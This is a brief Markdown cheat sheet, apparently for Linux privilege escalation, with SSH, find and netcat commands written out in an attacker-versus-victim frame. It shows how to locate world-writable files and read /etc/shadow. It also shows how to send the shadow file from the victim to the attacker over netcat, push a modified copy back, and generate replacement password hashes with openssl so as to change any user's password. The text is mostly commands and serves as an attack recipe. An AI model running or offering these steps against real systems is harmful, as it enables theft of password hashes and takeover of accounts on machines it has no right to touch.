
Connect with SSH 
```sh
ssh user@<ip_address> -oHostKeyAlgorithms=+ssh-rsa
```

List all files or directories  which is writable by other users too
```bash
find / -not -type l -perm -o+w 2>/dev/null
```

###### 3 Files we much remined to check at first 
```
/etc/passwd
/etc/shadow
/etc/sudoers
```


`/etc/shadow` file where Linux password save by default
```
cat /etc/shadow   ---> rwxrw-rw- /etc/shadow
```

we can change the password of any user, or read the file without administrative permission.


###### Transfer any file from victim using `netcat` 
`Victim system`
```sh
nc -lvnp 4444 < /etc/shadow
```
`Attacker system`
```sh
nc <victim_ip> 4444 > file_name
```

###### Change and Send back to the victim 
`Victim system`
```sh
nc -lvnp 4444 > file_name
```
`Attacker system`
```sh
nc <victim_ip> 4444 < file_name
```


###### Linux password algorithm (SHA-512)
```bash
openssl passwd -6 hello
```
or
```bash
openssl passwd -1 -salt abc password 
```